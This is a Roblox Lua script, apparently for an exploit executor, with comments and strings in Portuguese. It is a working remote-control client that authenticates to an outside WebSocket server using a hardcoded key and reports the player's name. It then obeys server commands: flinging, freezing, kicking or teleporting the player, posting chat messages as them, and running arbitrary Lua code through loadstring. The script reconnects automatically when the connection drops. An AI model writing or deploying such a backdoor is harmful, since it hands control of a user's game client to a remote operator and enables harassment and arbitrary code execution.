local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

local WS_URL = "wss://kiben-script-server.onrender.com"
local CHAVE_SECRETA = "BatataFritaComQueijo123"

local websocket = nil

local function executarFling()
    local char = LocalPlayer.Character
    local rootPart = char and char:FindFirstChild("HumanoidRootPart")
    if rootPart then
        local bav = Instance.new("BodyAngularVelocity")
        bav.AngularVelocity = Vector3.new(99999, 99999, 99999)
        bav.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
        bav.Parent = rootPart
        
        local bv = Instance.new("BodyVelocity")
        bv.Velocity = Vector3.new(0, 500, 0)
        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bv.Parent = rootPart
        
        task.spawn(function()
            task.wait(0.5)
            bav:Destroy()
            bv:Destroy()
        end)
    end
end

local function executarFreeze()
    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
        humanoid.Parent.HumanoidRootPart.Anchored = true
    end
end

local function executarUnfreeze()
    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
        humanoid.Parent.HumanoidRootPart.Anchored = false
    end
end

local function executarKick()
    LocalPlayer:Kick("Você foi desconectado pelo KiBen.")
end

local function executarBring(payload, remetente)
    local char = LocalPlayer.Character
    local rootPart = char and char:FindFirstChild("HumanoidRootPart")
    if rootPart then
        if type(payload) == "table" then
            rootPart.CFrame = CFrame.new(Vector3.new(payload[1], payload[2], payload[3]))
        else
            local adminPlayer = Players:FindFirstChild(remetente)
            if adminPlayer and adminPlayer.Character and adminPlayer.Character:FindFirstChild("HumanoidRootPart") then
                rootPart.CFrame = adminPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(3, 0, 3)
            end
        end
    end
end

local function executarCustomCode(codigo)
    local success, err = pcall(function()
        local func = loadstring(codigo)
        if func then
            task.spawn(func)
        end
    end)
    if not success then
        warn("Erro ao executar código customizado: ", err)
    end
end

local function executarChat(mensagem)
    pcall(function()
        local textChatService = game:GetService("TextChatService")
        local channels = textChatService:WaitForChild("TextChannels", 2)
        if channels and channels:FindFirstChild("RBXGeneral") then
            channels.RBXGeneral:SendAsync(tostring(mensagem))
            return
        end
    end)
    pcall(function()
        local chatEvents = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
        if chatEvents and chatEvents:FindFirstChild("SayMessageRequest") then
            chatEvents.SayMessageRequest:FireServer(tostring(mensagem), "All")
        end
    end)
end

local function conectarWebSocket()
    local success, err = pcall(function()
        websocket = WebSocket.connect(WS_URL)
    end)

    if not success then
        task.wait(5)
        conectarWebSocket()
        return
    end

    websocket:Send(HttpService:JSONEncode({
        tipo = "auth",
        chave = CHAVE_SECRETA,
        jogador = LocalPlayer.Name
    }))

    websocket.OnMessage:Connect(function(message)
        local data = HttpService:JSONDecode(message)
        if not data or not data.comando then return end

        if data.comando == "fling" then
            executarFling()
        elseif data.comando == "freeze" then
            executarFreeze()
        elseif data.comando == "unfreeze" then
            executarUnfreeze()
        elseif data.comando == "kick" then
            executarKick()
        elseif data.comando == "bring" then
            executarBring(data.payload, data.remetente)
        elseif data.comando == "custom" and data.payload then
            executarCustomCode(data.payload)
        elseif data.comando == "chat" and data.payload then
            executarChat(data.payload)
        end
    end)

    websocket.OnClose:Connect(function()
        websocket = nil
        task.wait(5)
        conectarWebSocket()
    end)
end

task.spawn(conectarWebSocket)
